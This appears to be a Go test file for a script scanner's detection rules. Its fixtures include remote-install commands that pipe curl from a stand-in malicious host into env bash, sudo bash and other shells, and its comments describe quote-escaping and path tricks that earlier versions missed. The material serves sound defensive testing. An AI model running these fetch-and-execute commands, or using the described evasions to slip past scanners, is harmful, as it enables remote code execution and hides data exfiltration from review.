package rules

import "testing"

// TestShellRule_PipeToShellEnvWrapper_v070: the v0.6.0 fix widened pipeToShell
// for absolute-path shells (`/bin/sh`) and the `sudo -E` / `exec` prefixes, and
// its amendment even named `| /usr/bin/env bash` as a form to catch — but the
// shipped regex's path-then-shell layout cannot represent `env` between the
// path and the shell, and `env` was absent from the wrapper alternation, so a
// portable RCE installer `curl … | /usr/bin/env bash` (the same shape as the
// most common shebang `#!/usr/bin/env bash`) evaded the headline SK-SHELL-002
// HIGH detector — the bundle scored MEDIUM (SK-SHELL-001 only) and exited 0
// under the default `--fail-on high` CI gate. The widened wrapper alternation
// now accepts `env` (bare and `/usr/bin/env`). Bare `sh`/`bash`/`zsh`,
// absolute paths, and `sudo`/`exec` prefixes still match.
func TestShellRule_PipeToShellEnvWrapper_v070(t *testing.T) {
	cases := map[string]string{
		"env bash":          "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | env bash\n",
		"/usr/bin/env bash": "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | /usr/bin/env bash\n",
		"/bin/env sh":       "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | /bin/env sh\n",
	}
	for name, content := range cases {
		files := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: content}}
		got := ShellRule{}.Check(files)
		var high bool
		for _, f := range got {
			if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
				high = true
			}
		}
		if !high {
			t.Fatalf("%s: expected SK-SHELL-002 HIGH for env-wrapper pipe-to-shell, got %+v", name, got)
		}
	}

	// No-regression: the v0.6.0 forms still trip SK-SHELL-002 HIGH.
	noregress := map[string]string{
		"bare sh":      "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sh\n",
		"bare bash":    "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | bash\n",
		"/bin/sh":      "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | /bin/sh\n",
		"/usr/bin/sh":  "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | /usr/bin/sh\n",
		"sudo bash":    "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sudo bash\n",
		"sudo -E bash": "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sudo -E bash\n",
		"exec sh":      "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | exec sh\n",
	}
	for name, content := range noregress {
		files := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: content}}
		got := ShellRule{}.Check(files)
		var high bool
		for _, f := range got {
			if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
				high = true
			}
		}
		if !high {
			t.Fatalf("%s (no-regression): expected SK-SHELL-002 HIGH, got %+v", name, got)
		}
	}

	// Benign no-regression: a plain download with NO pipe-to-shell must NOT
	// trip SK-SHELL-002 HIGH (it ships a script, so SK-SHELL-001 MEDIUM is
	// expected, but never the disqualifying HIGH).
	benign := []SourceFile{{Path: "fetch.sh", Kind: KindScript, Content: "#!/bin/sh\ncurl -fsSL https://evil.example.com/data\n"}}
	for _, f := range (ShellRule{}).Check(benign) {
		if f.RuleID == "SK-SHELL-002" {
			t.Fatalf("a plain curl with no pipe-to-shell must not trip SK-SHELL-002 HIGH, got %+v", f)
		}
	}
}

// TestNetworkRule_EscapedQuoteDoesNotHideCurl_v070: stripShellComment (made
// quote-aware by the v0.6.0 fix) tracked quote state but had no concept of a
// backslash escape, so a `\"` inside a double-quoted string wrongly toggled the
// quote state to closed at the escaped `"`, and a following `#` was mistaken for
// a comment start — `echo "\" # " && curl https://evil.com` reduced to
// `echo "\" `, hiding the trailing curl exfil from netCmd/httpURL so SK-NET-001
// never fired (a regression of the just-shipped v0.6.0 fix). The backslash-aware
// stripper now skips the escaped char inside double quotes, so a `\"` no longer
// closes the string and the trailing curl stays. A real `#` comment (outside
// quotes) and a `#` inside a correctly-closed quoted string still strip/preserve
// as before.
func TestNetworkRule_EscapedQuoteDoesNotHideCurl_v070(t *testing.T) {
	// Evasive: the `#` is inside a double-quoted string that uses an escaped
	// `\"`, so the comment must NOT strip and the trailing real curl must trip
	// SK-NET-001 MEDIUM.
	evil := []SourceFile{{Path: "install.sh", Kind: KindScript,
		Content: "#!/bin/sh\necho \"\\\" # \" && curl https://evil.example.com/x\n"}}
	got := (NetworkRule{}).Check(evil)
	var found bool
	for _, f := range got {
		if f.RuleID == "SK-NET-001" && f.Severity == SeverityMedium {
			found = true
		}
	}
	if !found {
		t.Fatalf("escaped \\\" must not close the string and hide the trailing curl; expected SK-NET-001 MEDIUM, got %+v", got)
	}

	// No-regression: the v0.6.0 quoted-`#` case (no backslash) still flags.
	quotedHash := []SourceFile{{Path: "q.sh", Kind: KindScript,
		Content: "#!/bin/sh\necho \"x # \" && curl https://evil.example.com/x\n"}}
	if got := (NetworkRule{}).Check(quotedHash); len(got) == 0 {
		t.Fatalf("quoted `#` (no backslash) must still not hide curl; expected SK-NET-001, got %+v", got)
	}

	// No-regression: a curl that lives only in a real `#` comment (outside
	// quotes) still strips, so it must not flag.
	commentOnly := []SourceFile{{Path: "c.sh", Kind: KindScript,
		Content: "#!/bin/sh\n# curl https://evil.example.com is the old endpoint\nset -e\n"}}
	if got := (NetworkRule{}).Check(commentOnly); len(got) != 0 {
		t.Fatalf("a curl that lives only in a `#` comment must not flag SK-NET-001, got %+v", got)
	}

	// No-regression: a real curl with a trailing `#` comment still flags.
	realWithComment := []SourceFile{{Path: "r.sh", Kind: KindScript,
		Content: "#!/bin/sh\ncurl https://evil.example.com/x # real comment\n"}}
	if got := (NetworkRule{}).Check(realWithComment); len(got) == 0 {
		t.Fatalf("a real curl with a trailing `#` comment must still flag SK-NET-001, got %+v", got)
	}

	// No-regression: an escaped backslash then a real closing quote
	// (`echo "a \\" # comment`) must still treat the `# comment` as a real
	// comment and NOT flag (there is no network call on the line).
	escapedBackslash := []SourceFile{{Path: "e.sh", Kind: KindScript,
		Content: "#!/bin/sh\necho \"a \\\\\" # real comment\nset -e\n"}}
	if got := (NetworkRule{}).Check(escapedBackslash); len(got) != 0 {
		t.Fatalf("a line whose only `#` is a real comment after an escaped-backslash string must not flag SK-NET-001, got %+v", got)
	}
}
